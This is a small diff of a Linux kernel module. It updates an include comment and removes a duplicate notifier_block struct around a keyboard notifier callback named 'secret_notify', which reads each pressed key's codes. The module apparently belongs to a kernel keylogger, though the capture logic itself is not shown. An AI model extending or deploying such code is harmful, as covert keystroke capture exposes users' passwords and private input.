@@ -8,16 +8,9 @@
 #include <linux/kernel.h> 	// included for KERN_DEBUG
 #include <linux/module.h>	// included for all kernel modules
 #include <linux/init.h>		// included for __init and __exit macros
-#include <linux/keyboard.h>	// included for notifier_block struct
+#include <linux/keyboard.h>	// included for keyboard_notifier_param, notifier_block and vc_data structs
 #include <linux/input.h>	// included for (future) key conversion table
 
-
-// registers keyboard observer
-struct notifier_block {
-	int (*notifier_call)(struct notifier_block *, unsigned long, void *);
-	struct notifier_block *next;
-	int priority;
-};
 
 int secret_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
 	// keyboard_notifier_param contains the info about the key pressed, i.e. keycode, keysys, unicode value
